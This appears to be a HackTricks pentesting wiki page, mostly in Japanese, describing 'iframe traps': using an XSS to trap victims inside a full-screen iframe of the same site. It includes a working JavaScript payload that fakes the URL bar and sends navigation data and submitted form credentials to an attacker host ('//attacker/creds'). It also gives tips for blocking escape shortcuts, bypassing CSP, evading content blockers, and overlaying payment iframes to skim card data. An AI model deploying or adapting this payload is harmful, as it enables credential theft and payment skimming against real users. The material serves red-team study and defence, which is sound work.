# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## Basic Information

iframeを使ったXSSの悪用によって、ユーザーがウェブページ内を移動する際の情報を盗むこの手法は、trustedsec.comの以下の2つの投稿で元々公開されました: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **and** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

攻撃はXSSに脆弱なページから始まり、アプリケーション全体を占有するiframe内で被害者が移動するようにして、被害者が**XSSの外に出ない（victims don't leave the XSS）**ようにします。

XSSは画面全体を占めるiframeにウェブページを読み込ませます。したがって、被害者は**自分がiframeの中にいることに気づかない（won't notice he is inside an iframe）**でしょう。そして、被害者がiframe内のリンクをクリックしてページを移動すると、読み込まれた任意のJSがそのナビゲーションから情報を盗みながら、被害者は**iframe内を移動している（navigating inside the iframe）**ことになります。

さらに現実味を持たせるために、iframeがページのlocationを変更したときに検知するための**listeners**を使い、ブラウザのURLをその移動先に合わせて更新し、ユーザーがブラウザでページを移動していると思わせることができます。

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

また、listenersを使えば、被害者が訪れている他のページだけでなく、フォームに**入力したデータ（filled forms）**を盗んで送信したり、**local storageを盗む**ことも可能です。

もちろん主な制約は、被害者がタブを閉じるかブラウザに別のURLを入力すればiframeから抜け出せる点です。別の抜け方としてはページの**リフレッシュ**がありますが、これはiframe内で新しいページが読み込まれるたびに右クリックのコンテキストメニューを無効化したり、ユーザーのマウスがiframe外に移動したことを検知してリロードボタンをクリックさせるなどで部分的に**防止**できます。こうした場合、ブラウザのURLは元のXSSが存在するURLに更新されるため、ユーザーがリロードすると再び汚染されます（ただしこれはあまりステルスではありません）。

## Modernised trap (2024+)

* Use a **full‑viewport iframe** plus History/Navigation API to mimic real navigation.

<details>
<summary>フルビューポート iframe トラップ</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) は外側のURLバーを同期させるが、実際のURLをleakしない。
* Go **fullscreen** でブラウザUIを隠し、独自の偽アドレスバー/錠前アイコンを描画する。

## Overlay & skimmer usage

* 侵害されたマーチャントはホストされた payment iframes (Stripe, Adyen, etc.) を**pixel‑perfect overlay**に置き換え、実際のフレームが下に残る間にキーストロークを転送することがある。場合によってはレガシーなバリデーションAPIを使用してフローが破綻しないようにする。
* トップフレームにユーザーを閉じ込めることで、URLバーが変わっていないことに気づく前に**autofill/password‑manager**のデータを取得できる。

## Evasion tricks observed in 2025 research

* `about:blank`/`data:` ローカルフレームは親の origin を継承し、一部の content‑blocker ヒューリスティクスを回避する；ネストされた iframes は拡張機能がサードパーティフレームを破棄しても再生成されることがある。
* **Permission propagation**: 親の `allow` 属性を書き換えると、明らかな DOM の変化なしにネストされた攻撃者フレームにfullscreen/camera/microphone を付与できる。

## Quick OPSEC tips

* マウスが離れたとき（body の `mouseleave`）に iframe に再フォーカスして、ユーザーがブラウザ UI に到達するのを防ぐ。
* フレーム内でコンテキストメニューと一般的なショートカット（`keydown` での `F11`, `Ctrl+L`, `Ctrl+T`）を無効にして脱出の試みを遅らせる。
* CSP がインラインスクリプトをブロックする場合、リモートの bootstrapper を注入し iframe の `srcdoc` を有効にして、ペイロードをメインページで適用された CSP の外に置く。

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## 参考資料

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
